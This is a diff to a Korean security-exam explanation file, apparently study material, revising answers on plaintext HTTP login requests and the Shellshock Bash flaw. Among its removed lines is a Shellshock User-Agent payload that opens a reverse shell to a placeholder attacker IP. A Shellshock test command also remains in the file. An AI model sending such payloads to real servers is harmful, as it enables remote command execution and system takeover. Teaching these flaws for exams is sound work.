@@ -61,12 +61,14 @@
     "15": {
       "domain": "애플리케이션보안",
       "explanation": "HTTP 요청 보안 문제. ①**id/password가 GET 파라미터 평문** → URL·로그·Referer·브라우저 히스토리에 노출, 스니핑 취약(민감정보는 POST + HTTPS). ②쿠키가 평문 전송 → 세션 하이재킹(Secure 속성 필요). ③**HTTPS(443)에서 HTTP(80)로 전환** → 암호화 안 된 구간 발생. ④Cache-Control로 캐시 미사용 시 서버 부하.",
-      "supplement": "```\nGET /login.jsp?id=admin&password=1q2w3e4r HTTP/1.1\nHost: www.example.com\nCache-Control: no-cache, must-revalidate\nCookie: JSESSIONID=A1B2C3D4E5F6; auth=Y; user_level=9\nReferer: https://www.example.com/main.jsp\nConnection: keep-alive\nUser-Agent: Mozilla/5.0\n```\n\n- 요청은 **80번 포트(HTTP, 평문)** 로 전송되나 Referer는 `https://`\n- 로그인 정보(`id`, `password`)가 **GET 파라미터에 평문**\n- 세션·권한 쿠키가 평문 구간에 노출\n- `Cache-Control: must-revalidate` 로 캐시 미사용 → 원본 서버 부하"
+      "supplement": "Source PORT: 443, Destination PORT: 80\n\n```\nGET /login.php HTTP/1.1\nHost: test.com\nConnection: keep-alive\nCookie: sEsz4sH5bClhslfOeJgjxdi==\nPragma: no-cache\nCache-Control: must-revalidate\nContent-length: 32\n\nid=admin&password=1234&act=login\n```",
+      "supplementSrc": "provided"
     },
     "16": {
       "domain": "시스템보안",
       "explanation": "**Shellshock**(CVE-2014-6271). (B) 원인: Bash가 환경변수에 담긴 **함수 정의 문자열(`() { ...; }`) 뒤에 붙은 명령까지 실행**하는 파싱 결함. (C) `env x='() { :;}; 명령' bash -c ...` 또는 CGI의 User-Agent 등을 통해 원격 명령 실행 → 흔히 공격자 서버로 리버스 셸 연결. 대응: Bash 패치, mod_cgi 비활성화, WAF. 7·29회 관련.",
-      "supplement": "Bash 쉘 취약점 점검 중 확인된 내용(재구성):\n```\n# 취약 여부 확인\n$ env x='() { :;}; echo vulnerable' bash -c \"echo test\"\nvulnerable\ntest\n\n# 원격 공격 예 — 취약한 CGI 에 조작된 User-Agent 헤더 전송\nUser-Agent: () { :;}; /bin/bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n```"
+      "supplement": "취약 여부 확인 명령:\n\n```\n$ env x='() { :;}; echo vulnerable' bash -c \"echo test\"\n```",
+      "supplementSrc": "provided"
     }
   }
 }
